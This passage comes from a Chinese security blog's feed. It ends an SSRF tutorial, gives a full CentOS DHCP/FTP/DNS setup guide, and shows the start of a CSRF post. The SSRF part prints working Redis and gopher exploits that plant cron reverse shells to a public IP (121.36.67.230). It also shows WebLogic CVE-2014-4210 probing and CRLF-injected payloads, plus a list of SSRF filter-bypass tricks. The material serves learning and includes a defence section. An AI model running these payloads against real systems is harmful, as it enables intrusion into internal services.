alt="在这里插入图片描述"><br>一条一条的执行就可以了。<br><strong>3.利用<code>gopher</code>协议</strong><br>（1）攻击内网redis并反弹shell<br>利用redis未授权访问攻击redis<br><code>攻击redis的exp</code></p><pre><code class="shell">echo -e &quot;\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/121.36.67.230/5555 0&gt;&amp;1\n\n\n&quot;|redis-cli -h $1 -p $2 -x set 1redis-cli -h $1 -p $2 config set dir /var/spool/cron/redis-cli -h $1 -p $2 config set dbfilename rootredis-cli -h $1 -p $2 saveredis-cli -h $1 -p $2 quit</code></pre><pre><code class="shell">bash shell.sh 39.x.x.x 6379</code></pre><p>从而捕获到数据，并进行转换<br>转换规则如下：<br>如果第一个字符是<code>&gt;</code>或者<code>&lt;</code>那么丢弃该行字符串，表示请求和返回的时间。<br>如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。<br>将<code>\r</code>字符串替换成<code>%0d%0a</code><br>空白行替换为<code>%0a</code></p><p>结合gopher协议攻击内网redis，使用上边捕获数据的转换结果即可，然后进行反弹shell：</p><pre><code class="shell">curl -v &#39;http://39.x.x.x:8000/ssrf.php?url=gopher://192.168.1.4:6379/_*1%250d%250a%248%250d%250aflushall%250d%250a%2a3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2464%250d%250a%250d%250a%250a%250a%2a%2f1%20%2a%20%2a%20%2a%20%2a%20bash%20-i%20%3E%26%20%2fdev%2ftcp%2f121.36.67.230%2f5555%200%3E%261%250a%250a%250a%250a%250a%250d%250a%250d%250a%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2fvar%2fspool%2fcron%2f%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2a1%250d%250a%244%250d%250asave%250d%250aquit%250d%250a&#39;</code></pre><p><img src="http://img-blog.csdnimg.cn/20200315192751112.jpg" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/2020031519243676.jpg" alt="在这里插入图片描述"><br>反弹成功<br><code>http://39.x.x.x:8000/ssrf.php</code>是存在SSRF漏洞的Web服务<br><code>192.168.1.4</code>是redis应用所在内网ip<br><code>121.36.67.230</code>是公网服务器，接收反弹shell<br>（2）伪造post请求反弹shell</p><pre><code class="shell">curl -v &#39;http://39.x.x.x:8000/ssrf.php?url=gopher://192.168.1.5:80/_POST%20/post.php%20HTTP/1.1%250d%250aHost:%2039.105.93.165%250d%250aUser-Agent:%20curl/7.58.0%250d%250aAccept:%20*/*%250d%250aContent-Type:%20application/x-www-form-urlencoded%250d%250a%250d%250acmd%3Dccccc%250d%250a%250d%250abash%20-i%20%3E%26%20%2fdev%2ftcp%2f121.36.67.230%2f4444%200%3E%261&#39;</code></pre><p><img src="http://img-blog.csdnimg.cn/20200315192908343.jpg" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20200315192635710.jpg" alt="在这里插入图片描述"><br>反弹成功<br><code>192.168.1.5</code>是内网Web服务，有post.php<br><strong>4 .利用<code>http/s</code>协议</strong><br>探测内网主机存活<br><img src="http://img-blog.csdnimg.cn/2020031503404153.jpg" alt="在这里插入图片描述"><br>说明内网ip为<code>192.168.1.3</code>的主机存活</p><h3 id="0x04-SSRF攻击应用实战"><a href="#0x04-SSRF攻击应用实战" class="headerlink" title="0x04 SSRF攻击应用实战"></a>0x04 SSRF攻击应用实战</h3><h4 id="1、gopher攻击redis"><a href="#1、gopher攻击redis" class="headerlink" title="1、gopher攻击redis"></a>1、gopher攻击redis</h4><p>参考<strong>远程利用 3.利用<code>gopher</code>协议</strong></p><h4 id="2、weblogic-ssrf攻击redis"><a href="#2、weblogic-ssrf攻击redis" class="headerlink" title="2、weblogic ssrf攻击redis"></a>2、weblogic ssrf攻击redis</h4><p>CVE-2014-4210<br>下载地址：<a href="https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</a><br>编译并启动环境</p><pre><code class="shell">docker-compose builddocker-compose up -d</code></pre><p>SSRF漏洞存在于<code>http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp</code><br><strong>1.查看端口</strong><br>访问</p><pre><code class="php">/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:80//测试http://127.0.0.1:7001：将80替换成7001</code></pre><p><img src="http://img-blog.csdnimg.cn/20200315212726403.jpg" alt="在这里插入图片描述"><br>not connect，说明80端口未开放<br><img src="http://img-blog.csdnimg.cn/20200315213259661.jpg" alt="在这里插入图片描述"><br>返回404，说明端口开放<br><strong>2.探测内网主机存活</strong><br><img src="http://img-blog.csdnimg.cn/20200315220452561.jpg" alt="在这里插入图片描述"><br>说明内网ip为<code>192.168.1.1</code>的主机存活<br><strong>3.注入HTTP头，利用Redis反弹shell</strong><br>通过ssrf探测内网中的redis服务器，发现172.22.0.2:6379可以连通<br>和上边的远程利用几乎一样。<br><img src="http://img-blog.csdnimg.cn/20200315214024658.jpg" alt="在这里插入图片描述"><br>将反弹shell脚本写入/etc/crontab定时任务</p><pre><code class="shell">set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/121.36.67.230/4444 0&gt;&amp;1\n\n\n\n&quot;config set dir /etc/config set dbfilename crontabsave</code></pre><p>进行url编码</p><pre><code class="shell">test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F121.36.67.230%2F4444%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa</code></pre><p>换行符是“\r\n”换成“%0D%0A”。将url编码后的字符串放在ssrf的域名后面，发送<br><img src="http://img-blog.csdnimg.cn/20200315214948662.jpg" alt="在这里插入图片描述"><br>反弹成功<br><img src="http://img-blog.csdnimg.cn/2020031521485090.jpg" alt="在这里插入图片描述"></p><h3 id="0x05-SSRF漏洞相关绕过"><a href="#0x05-SSRF漏洞相关绕过" class="headerlink" title="0x05 SSRF漏洞相关绕过"></a>0x05 SSRF漏洞相关绕过</h3><h4 id="1、常用绕过方法"><a href="#1、常用绕过方法" class="headerlink" title="1、常用绕过方法"></a>1、常用绕过方法</h4><p><strong>1.@</strong></p><pre><code class="php">http://abc@127.0.0.1实际上是以用户名abc连接到站点127.0.0.1，同理http://8.8.8.8@127.0.0.1:8080、http://127.0.0.1#8.8.8.8</code></pre><p>在对@解析域名中，不同的处理函数存在处理差异，如：<br><code>http://www.aaa.com@www.bbb.com@www.ccc.com</code><br>在PHP的<code>parse_url</code>中会识别<a href="http://www.ccc.com，而`libcur`l则识别为www.bbb.com" target="_blank" rel="noopener">www.ccc.com，而`libcur`l则识别为www.bbb.com</a><br><strong>2.利用[::]</strong><br>可以利用<code>[::]</code>来绕过localhost</p><pre><code class="php">http://[::]:80/  &gt;&gt;&gt;  http://127.0.0.1</code></pre><p><strong>3.添加端口号</strong></p><pre><code class="php">http://127.0.0.1:8080</code></pre><p><strong>4.利用短网址</strong><br><a href="https://tool.chinaz.com/tools/dwz.aspx" target="_blank" rel="noopener">站长工具短网址</a><br><a href="https://dwz.cn/" target="_blank" rel="noopener">百度短网址</a><br><strong>5.利用特殊域名</strong><br>原理是DNS解析。xip.io可以指向任意域名，即</p><pre><code class="php">127.0.0.1.xip.io，可解析为127.0.0.1</code></pre><p><strong>6.利用DNS解析</strong><br>在域名上设置A记录，指向127.0.1<br><strong>7.利用进制转换</strong></p><blockquote><p>127.0.0.1<br>八进制：0177.0.0.1<br>十六进制：0x7f.0.0.1<br>十进制：2130706433</p></blockquote><p><strong>8.句号</strong></p><pre><code class="php">127。0。0。1  &gt;&gt;&gt;  127.0.0.1</code></pre><p><strong>9.302跳转</strong><br>使用<a href="http://tinyurl.com生成302跳转地址" target="_blank" rel="noopener">http://tinyurl.com生成302跳转地址</a></p><h4 id="2、常见限制"><a href="#2、常见限制" class="headerlink" title="2、常见限制"></a>2、常见限制</h4><p><strong>1.限制为<a href="http://www.xxx.com" target="_blank" rel="noopener">http://www.xxx.com</a> 域名</strong><br>采用http基本身份认证的方式绕过。即@<br><code>http://www.xxx.com@www.xxc.com</code><br><strong>2.限制请求IP不为内网地址</strong><br>当不允许ip为内网地址时<br>（1）采取短网址绕过<br>（2）采取特殊域名<br>（3）采取进制转换<br><strong>3.限制请求只为http协议</strong><br>（1）采取302跳转<br>（2）采取短地址</p><h3 id="0x06-SSRF漏洞防御"><a href="#0x06-SSRF漏洞防御" class="headerlink" title="0x06 SSRF漏洞防御"></a>0x06 SSRF漏洞防御</h3><p>1、禁用不需要的协议(如：<code>file:///</code>、<code>gopher://</code>,<code>dict://</code>等)。仅仅允许http和http请求<br>2、统一错误信息，防止根据错误信息判断端口状态<br>3、禁止302跳转，或每次跳转，都检查新的Host是否是内网IP，直到抵达最后的网址<br>4、设置URL白名单或者限制内网IP</p><h3 id="0x07-后记"><a href="#0x07-后记" class="headerlink" title="0x07 后记"></a>0x07 后记</h3><p>在SSRF漏洞的学习过程中，遇到了一些问题，比如反弹shell到公网服务器，折腾了许久。不过最终克服了问题。同时，通过SSRF漏洞的学习，发现SSRF漏洞果然比CSRF漏洞的利用的局限性要小，并且SSRF漏洞的对内网的一些应用危害比较大。所以在开发过程中，要尽量避免产生SSRF漏洞。</p><p>参考博客：<br><a href="http://damit5.com/2018/05/26/SSRF-%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/#0x01-SSRF-%E6%A6%82%E8%BF%B0" target="_blank" rel="noopener">SSRF 漏洞学习</a><br><a href="https://www.cnblogs.com/flokz/p/weblogic_SSRF.html" target="_blank" rel="noopener">SSRF——weblogic vulhub 漏洞复现及攻击内网redis（一）</a><br><a href="https://www.jianshu.com/p/fd27f0eedccf" target="_blank" rel="noopener">ssrf攻击内网应用</a><br><a href="https://www.secpulse.com/archives/65832.html" target="_blank" rel="noopener">SSRF绕过方法总结</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> SSRF漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 相关函数和协议 </tag>
            
            <tag> 漏洞利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Centos-DHCP、FTP和DNS搭建与配置</title>
      <link href="/2020/03/11/Centos-DHCP%E3%80%81FTP%E5%92%8CDNS%E6%90%AD%E5%BB%BA%E4%B8%8E%E9%85%8D%E7%BD%AE/"/>
      <url>/2020/03/11/Centos-DHCP%E3%80%81FTP%E5%92%8CDNS%E6%90%AD%E5%BB%BA%E4%B8%8E%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>记录一下，Linux网络与集群管理这门课程的一些服务搭建与管理配置。以下服务都是在Centos进行搭建的。</p><h3 id="0x01-DHCP服务器的搭建与配置"><a href="#0x01-DHCP服务器的搭建与配置" class="headerlink" title="0x01 DHCP服务器的搭建与配置"></a>0x01 DHCP服务器的搭建与配置</h3><p><strong>DHCP服务器作用：</strong><br>为大量客户机自动分配地址，提供集中管理<br>减轻管理和维护成本、提高网络配置效率<br><strong>DHCP原理</strong><br><img src="http://img-blog.csdnimg.cn/20200304002438913.jpg" alt="在这里插入图片描述"><br>OFFER只有ip、ACK分配DNS等。<br><strong>DHCP相关配置</strong><br>1、端口：udp67 udp68<br>2、服务： dhcp dhrelay<br>3、配置文件：/etc/dhcp/dhcpd.conf<br>​4、中继文件：/etc/sysconfig/dhcrelay</p><h4 id="1、DHCP安装"><a href="#1、DHCP安装" class="headerlink" title="1、DHCP安装"></a>1、DHCP安装</h4><pre><code class="shell">yum –y install dhcp</code></pre><p><img src="http://img-blog.csdnimg.cn/20200304003206482.jpg" alt="在这里插入图片描述"></p><h4 id="2、DHCP配置"><a href="#2、DHCP配置" class="headerlink" title="2、DHCP配置"></a>2、DHCP配置</h4><p><strong>1.查找并复制模板文件</strong></p><pre><code class="shell">#查找dhcp服务的配置模版文件。example有的是sample、rpm -ql dhcp | grep dhcpd.conf.example#复制配置模板并到/etc/dhcp/dhcpd.confcp -rf /usr/share/doc/dhcp-4.2.5/dhcpd.conf.example /etc/dhcp/dhcpd.conf</code></pre><p><img src="http://img-blog.csdnimg.cn/20200304003507536.jpg" alt="在这里插入图片描述"><br><strong>2.修改dhcp配置文件</strong></p><pre><code class="shell">#修改dhcp配置文件，全局配置,在配置文件修改以下内容vi /etc/dhcp/dhcpd.confsubnet 192.168.1.0 netmask 255.255.255.0 { #网段声明 subnet +网段 netmask+子网掩码range 192.168.1.100 192.168.1.200; #设置用于分配的ip地址池option domain-name-servers 2.2.2.2, 3.3.3.3; #配置DNS 服务器option routers 192.168.1.255; #设置客户机的默认网关#option broadcast-address #广播地址default-lease-time 600; #默认租约时间max-lease-time 7200; #指定最大租赁时间长度}#host qwzf { #主机声明，&quot;qwzf&quot;自己起的名字#hardware ethernet MAC地址 #指定其它pc（打印机）mac地址#fixed-address 192.168.1.100; #固定地址#}</code></pre><p><strong>3.启动dhcp、检查和关闭防火墙</strong></p><pre><code class="shell">service dhcpd start #启动netstat -anpu | grep dhcp #查看67端口是否工作systemctl stop firewalld #关闭防火墙setenforce 0 #关闭selinux防火墙</code></pre><h4 id="3、客户端验证"><a href="#3、客户端验证" class="headerlink" title="3、客户端验证"></a>3、客户端验证</h4><p>分别用Centos Linux和Win7进行验证。<br><strong>1.Centos</strong><br>（1）编辑网卡配置文件</p><pre><code class="shell">vi /etc/sysconfig/network-scripts/ifcfg-eth0</code></pre><p>（2）修改配置文件</p><pre><code class="shell">ONBOOT=yes是指系统启动时激活此设备BOOTPROTO=dhcp是指网卡的获取IP方式为dhcp想要改成静态获取的，可以把这个值设为static</code></pre><p>（3）保存退出，重启网卡</p><pre><code class="shell">service network restart</code></pre><p>当然也可以用</p><pre><code class="shell">ifup #或ifconfig eth0 upifdown #或ifconfig eth0 down#激活与关闭某个网络适配卡</code></pre><p>在客户端输入ifconfig，可以看到成功分配ip。<br>当然，如果不放心。可以复制客户端的mac地址，在服务器端粘贴mac，并配置指定分配ip。从而可以在客户端看到分配的指定ip。<br><strong>2.Win7</strong><br>直接在控制面板-&gt;网络和 Internet-&gt;网络连接。选择相应网卡，配置成自动获取ip，然后重启网卡。然后就可以看到成功分配ip。<br><img src="http://img-blog.csdnimg.cn/20200304005903723.jpg" alt="在这里插入图片描述"></p><h4 id="4、DHCP中继服务器"><a href="#4、DHCP中继服务器" class="headerlink" title="4、DHCP中继服务器"></a>4、DHCP中继服务器</h4><p>因为配置需要的虚拟机过多，这里就不验证了。可以参考下面的博客：<br><a href="https://www.cnblogs.com/me80/p/7461109.html" target="_blank" rel="noopener">CentOS7.3下关于DHCP中继代理服务器的详细配置</a></p><h3 id="0x02-FTP服务器的搭建与配置"><a href="#0x02-FTP服务器的搭建与配置" class="headerlink" title="0x02 FTP服务器的搭建与配置"></a>0x02 FTP服务器的搭建与配置</h3><h4 id="1、概述"><a href="#1、概述" class="headerlink" title="1、概述"></a>1、概述</h4><p><img src="http://img-blog.csdnimg.cn/20200304151104379.jpg" alt="在这里插入图片描述"><br>File Transfer Protocol(文件传输协议)，用于Internet上的控制文件的双向传输。<br>“下载”和“上传”<br>支持FTP协议的服务器就是FTP服务器。<br><strong>FTP连接及传输模式</strong><br>控制连接：TCP 21，用于发送FTP命令信息<br>数据连接：TCP 20，用于上传、下载数据。<br><strong>数据连接的建立类型</strong><br>主动模式：服务器从20端主动向客户端发起连接<br>被动模式：服务器在指定范围内某个端口被动等待客户端连接。(服务器开启相应端口，等待客户端发起连接)<br>主动模式端口：控制 21 传输数据 20<br>被动模式，服务端开启的端口随机<br><strong>FTP用户的类型</strong><br>匿名用户：anonymous、ftp<br>本地用户：账户名称、密码等信息保存在passwd、shadow文件中<br><strong>常见的FTP服务器程序</strong><br>IIS、Serv-U<br>wu-ftp、Proftpd<br>vsftpd（Very Secure FTP Daemon）<br><strong>常见的FTP客户端程序</strong><br>CuteFTP、FlashFXP、LeapFTP、Filezilla<br>gftp、kuftp<br>FTP命令<br><strong>vsftpd软件包</strong></p><ul><li>官方站点：<a href="https://vsftpd.beasts.org/" target="_blank" rel="noopener">https://vsftpd.beasts.org/</a></li><li>主程序：/usr/sbin/vsftpd</li><li>用户控制列表文件：<br>/etc/vsftpd/ftpusers<br>/etc/vsftpd/user_list</li><li>主配置文件：/etc/vsftpd/vsftpd.conf</li></ul><h4 id="2、FTP服务器搭建"><a href="#2、FTP服务器搭建" class="headerlink" title="2、FTP服务器搭建"></a>2、FTP服务器搭建</h4><h5 id="1-服务器端安装与配置"><a href="#1-服务器端安装与配置" class="headerlink" title="1.服务器端安装与配置"></a>1.服务器端安装与配置</h5><p><strong>1.安装vsftpd</strong></p><pre><code class="shell">yum -y install vsftpd</code></pre><p><img src="http://img-blog.csdnimg.cn/202003041643438.jpg" alt="在这里插入图片描述"><br><strong>2.开启vsftpd</strong></p><pre><code class="shell">service vsftpd start</code></pre><p><strong>3.关闭防火墙和selinux</strong></p><pre><code class="shell">iptables -Fsetenforce 0</code></pre><p><strong>4.配置ftp权限</strong><br><img src="http://img-blog.csdnimg.cn/20200309215241364.jpg" alt="在这里插入图片描述"></p><pre><code class="shell">vi /etc/vsftpd/vsftpd.conf#列出没有被注释的信息grep -v &quot;#&quot; vsftpd.conf#开启权限(启用匿名访问)：anonymous_enable=YES#允许上传文件anon_upload_enable=YES#匿名用户所上传文件的权限掩码（默认600）anon_umask=022#设置目录权限，改属主chown ftp /var/ftp/pubservice vsftpd restart # 重启</code></pre><p><img src="http://img-blog.csdnimg.cn/20200304165507243.jpg" alt="在这里插入图片描述"></p><h4 id="3、客户端验证-1"><a href="#3、客户端验证-1" class="headerlink" title="3、客户端验证"></a>3、客户端验证</h4><p><strong>1.安装ftp</strong></p><pre><code class="shell">yum -y install ftp</code></pre><p><strong>2.使用匿名用户登录ftp</strong></p><pre><code class="shell">ftp 192.168.x.x登录是否成功，看是否有Successfulftp或anonymous #不需要密码</code></pre><p><img src="http://img-blog.csdnimg.cn/20200304194956435.jpg" alt="在这里插入图片描述"><br><strong>3.匿名用户登录ftp进行上传与下载</strong></p><pre><code class="shell">!dir #列目录上传准备：1.修改配置文件里两个项目：#开启权限(启用匿名访问)：anonymous_enable=YES#允许上传文件anon_upload_enable=YES2.上传的文件夹要放开写权限3.服务器上的上传文件夹要放开写权限service vsftpd restart # 重启put 文件名 #上传get 文件名 #下载</code></pre><p>上传<br><img src="http://img-blog.csdnimg.cn/20200304213444674.jpg" alt="在这里插入图片描述"><br>下载<br><img src="http://img-blog.csdnimg.cn/20200304213656722.jpg" alt="在这里插入图片描述"></p><p><strong>4.使用本地用户登录ftp</strong><br><em>（1）服务端</em></p><pre><code class="shell">#可关闭匿名登录模式，即设置anonymous_enable=NO#允许本地用户登录FTPvi /etc/vsftpd/vsftpd.conflocal_enable=YES #默认是开启的write_enable=YES</code></pre><p><em>（2）客户端：</em><br>本地用户的工作目录在/home/用户名，如/home/ftpwmm</p><pre><code class="shell">ftp 192.168.x.x用户名 #需要密码</code></pre><p><strong>扩充1：禁止某用户登录</strong><br>默认禁止root身份登录。<br>编辑user_list文件，在列表中添加ftpwmm，则会禁止ftpwmm用户访问</p><pre><code class="shell">vi /etc/vsftpd/user_list</code></pre><p><img src="https://img-blog.csdnimg.cn/2020030922141123.jpg" alt="在这里插入图片描述"><br><strong>扩充2：配置默认访问路径</strong></p><pre><code class="shell">#配置默认访问路径，local_root 针对系统用户；anon_root 针对匿名用户vi /etc/vsftpd/vsftpd.conflocal_root=/var/ftp/local_pubchroot_local_user=YESservice vsftpd restart # 重启</code></pre><h3 id="0x03-DNS服务器的搭建与配置"><a href="#0x03-DNS服务器的搭建与配置" class="headerlink" title="0x03 DNS服务器的搭建与配置"></a>0x03 DNS服务器的搭建与配置</h3><p><strong>域名解析器</strong><br>host文件：hosts文件记录主机域名和ip的对应文件<br>NIS服务器：库存放解析记录<br>DNS服务器：用库存放目录，分布式解析</p><h4 id="1、域名服务器简介"><a href="#1、域名服务器简介" class="headerlink" title="1、域名服务器简介"></a>1、域名服务器简介</h4><p><img src="http://img-blog.csdnimg.cn/20200311141003472.jpg" alt="在这里插入图片描述"><br><strong>1.DNS作用</strong><br>正向解析：将域名(FQDN)解析成ip<br>反向解析：将ip解析成域名(FQDN)</p><blockquote><p>FQDN：Full Qualified Domain Name完全合格域名（完整域名）<br>一个域名对应一个ip<br>一个ip可以对应多个域名</p></blockquote><p><strong>2.DNS的工作模式</strong><br><img src="http://img-blog.csdnimg.cn/20200311153253827.jpg" alt="在这里插入图片描述"><br>递归查询(不管是否访问成功，访问一去一回)<br>迭代查询(多次询问，多次返回结果)<br><strong>3.域名结构</strong><br><img src="http://img-blog.csdnimg.cn/20200311141750478.jpg" alt="在这里插入图片描述"><br><code>.</code>  根域<br><code>.com</code> <code>.net</code>….顶级域名<br><code>.com.cn</code> …….二级域<br><code>www</code>、<code>mail</code>…主机名<br><strong>4.根DNS</strong><br>共有13台<br><img src="http://img-blog.csdnimg.cn/20200311142221753.jpg" alt="在这里插入图片描述"><br>M在日本，暂时查不到。<br><strong>5.域名服务器分类</strong><br><code>主域名服务器</code><br>特定DNS区域的官方服务器，具有唯一性<br>负责维护该区域内所有域名-&gt;ip地址的映射记录<br><code>从域名服务器</code><br>也称为辅助域名服务器<br>其维护的 域名-&gt;ip地址记录 来源于主域名服务器<br><code>缓存域名服务器</code><br>可运行域名服务器软件，提供间接信息<br><code>转发域名服务器</code><br>负责所有非本地域名的本地查询<br><strong>6.bind软件包</strong></p><blockquote><p>BIND<br>伯克利Internet域名服务<br>官方站点：<a href="https://www.isc.org(ftp://www.isc.org)" target="_blank" rel="noopener">https://www.isc.org(ftp://www.isc.org)</a><br>软件包：bind-x.x.x…..rpm<br>服务名：named<br>端口号：53<br>主配置文件：<code>/etc/named.conf</code><br>保存DNS解析记录的数据文件位于：<code>/var/named</code></p></blockquote><h4 id="2、域名服务器安装和配置"><a href="#2、域名服务器安装和配置" class="headerlink" title="2、域名服务器安装和配置"></a>2、域名服务器安装和配置</h4><p><strong>查看默认安装根域名服务器</strong></p><pre><code class="shell">vi /var/named/named.ca</code></pre><p><strong>1.安装</strong></p><pre><code class="shell">yum -y install bind*</code></pre><p><code>bind</code>：DNS服务器软件包<br><code>bind-utils</code>：DNS测试工具<br><code>bind-chroot</code>：使bind运行在指定目录(可安装，安装后很多默认位置发生改变)<br>如果安装bind-chroot(我这里感觉麻烦，没安装)</p><pre><code class="shell">cp /etc/named.conf /var/nammed/chroot/etc</code></pre><p><img src="http://img-blog.csdnimg.cn/20200311171714988.jpg" alt="在这里插入图片描述"><br><code>caching-nameserver</code>：高速缓冲DNS服务器基本配置文件<br><strong>配置文件详解</strong><br>（1）<code>/etc/named.conf</code>主配置文件</p><pre><code class="shell">vi /etc/named.conf</code></pre><pre><code class="shell">options {        listen-on port 53 { 127.0.0.1; }; #监听地址和端口，如果删除，会默认在所有接口UDP 53 端口监听服务        listen-on-v6 port 53 { ::1; };        directory       &quot;/var/named&quot;; #数据文件存放的目录(解析文件)        dump-file       &quot;/var/named/data/cache_dump.db&quot;; #缓存数据库文件        statistics-file &quot;/var/named/data/named_stats.txt&quot;; #状态统计文件的位置        memstatistics-file &quot;/var/named/data/named_mem_stats.txt&quot;;        recursing-file  &quot;/var/named/data/named.recursing&quot;;        secroots-file   &quot;/var/named/data/named.secroots&quot;;        allow-query     { localhost; }; #允许哪些网段的客户端使用DNS进行解析。若设置成any则对所有网段进行解析</code></pre><p>（2）<code>/etc/named.rfc1912.zones</code>区域配置文件</p><pre><code class="shell">zone &quot;localhost.localdomain&quot; IN { #zone表示区域,in跳转指针        type master; #主DNS服务器        file &quot;named.localhost&quot;; #指定正向解析数据文件位置        allow-update { none; }; };</code></pre><pre><code class="shell">zone &quot;1.0.0.127.in-addr.arpa&quot; IN {        type master;        file &quot;named.loopback&quot;; ##指定反向解析数据文件位置        allow-update { none; };};</code></pre><p>（3）数据文件<br>正向解析模板文件：<code>/var/named/named.localhost</code></p><pre><code class="shell">$TTL 1D@       IN SOA  @ rname.invalid. ( #@表示当前所在域域名，配置改成具体域名。rname.invalid.管理员邮箱                                        0       ; serial                                         1D      ; refresh #时间D表示天，W表示周                                        1H      ; retry                                        1W      ; expire                                        3H )    ; minimum        NS      @         A       127.0.0.1        AAAA    ::1</code></pre><p>反向解析模板文件：<code>/var/named/named.empty</code></p><pre><code class="shell">$TTL 3H@       IN SOA  @ rname.invalid. (                                        0       ; serial                                        1D      ; refresh                                        1H      ; retry                                        1W      ; expire                                        3H )    ; minimum        NS      @        A       127.0.0.1        AAAA    ::1</code></pre><p><strong>2.关闭防火墙和selinux</strong></p><pre><code class="shell">iptables -F#检查是否关闭getenforcesetenforce 0</code></pre><p><strong>3.配置文件</strong></p><blockquote><p>配置ip：ifconfig eth0 192.168.1.33</p></blockquote><p>（1）修改主配置文件<code>/etc/named.conf</code></p><pre><code class="shell">listen-on port 53 { 192.168.1.33; }; allow-query     { 192.168.1.0/24; }; #指定网段，也可以写成any所有网段</code></pre><p>（2）修改区域文件<code>/etc/named.rfc1912.zones</code><br>1）备份</p><pre><code class="shell">cp /etc/named.rfc1912.zones /etc/named.rfc1912.zones.bak</code></pre><p>2）修改<br>可删掉注释信息和无用项，只保留正向和反向</p><pre><code class="shell">zone &quot;qwzf.com&quot; IN { #zone表示区域,in跳转指针        type master; #主要区域        file &quot;qwzf.com.zone&quot;; #指定解析记录数据文件位置        allow-update { none; }; };</code></pre><pre><code class="shell">zone &quot;1.168.192.in-addr.arpa&quot; IN {        type master;        file &quot;192.168.1.zone&quot;;        allow-update { none; };};</code></pre><p>（3）修改数据文件<br>1）复制模板文件到指定数据文件</p><pre><code class="shell">cp -p /var/named/named.localhost /var/named/qwzf.com.zone #正向cp -p /var/named/named.empty /var/named/192.168.1.zone #反向#-p保存属性</code></pre><p>2）修改正向解析文件<code>qwzf.com.zone</code></p><pre><code class="shell">$TTL 1D@       IN SOA  qwzf.com. rname.invalid. ( #@表示当前所在域域名，配置改成具体域名。rname.invalid.管理员邮箱                                        0       ; serial                                         1D      ; refresh #时间D表示天，W表示周                                        1H      ; retry                                        1W      ; expire                                        3H )    ; minimum        NS      dns.qwzf.com.        MX  5   mail.qwzf.com.       #设置邮件域名服务器，数字越小优先级越高dns     A       192.168.1.33mail    A       192.168.1.34www     A       192.168.1.35ftp     CNAME   www*       A       192.168.1.100 #提供泛域名解析</code></pre><p>3）修改反向解析文件<code>192.168.1.zone</code></p><pre><code class="shell">$TTL 3H@       IN SOA  qwzf.com. rname.invalid. (                                        0       ; serial                                        1D      ; refresh                                        1H      ; retry                                        1W      ; expire                                        3H )    ; minimum        NS      dns.qwzf.com.        MX  5   mail.qwzf.com.33      PTR     dns.qwzf.com.34      PTR     mail.qwzf.com.35      PTR     www.qwzf.com.*       PTR     xxx.qwzf.com.</code></pre><p><strong>4.启动</strong></p><pre><code class="shell">service named start</code></pre><h4 id="3、客户端验证-2"><a href="#3、客户端验证-2" class="headerlink" title="3、客户端验证"></a>3、客户端验证</h4><p>添加dns服务器</p><pre><code class="shell">vi /etc/sysconfig/network-scripts/ifcfg-eth0#DNS1=192.168.1.33</code></pre><p>重启网卡</p><pre><code class="shell">service network restart</code></pre><p>测试</p><pre><code class="shell">nslookup #安装 nslookup, 直接安装bind-utils即可。yum -y install bind-utils</code></pre><p><img src="http://img-blog.csdnimg.cn/20200311182024367.jpg" alt="在这里插入图片描述"><br>测试成功，ok。</p><h3 id="0x04-后记"><a href="#0x04-后记" class="headerlink" title="0x04 后记"></a>0x04 后记</h3><p>本篇博客主要记录了DHCP、FTP、DNS服务器的搭建。总的来说没踩多少坑，继续努力！</p>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
          <category> Linux网络服务 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> DHCP </tag>
            
            <tag> FTP </tag>
            
            <tag> DNS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从一些常见场景到CSRF漏洞利用</title>
      <link href="/2020/03/04/%E4%BB%8E%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E5%9C%BA%E6%99%AF%E5%88%B0CSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
      <url>/2020/03/04/%E4%BB%8E%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E5%9C%BA%E6%99%AF%E5%88%B0CSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
      
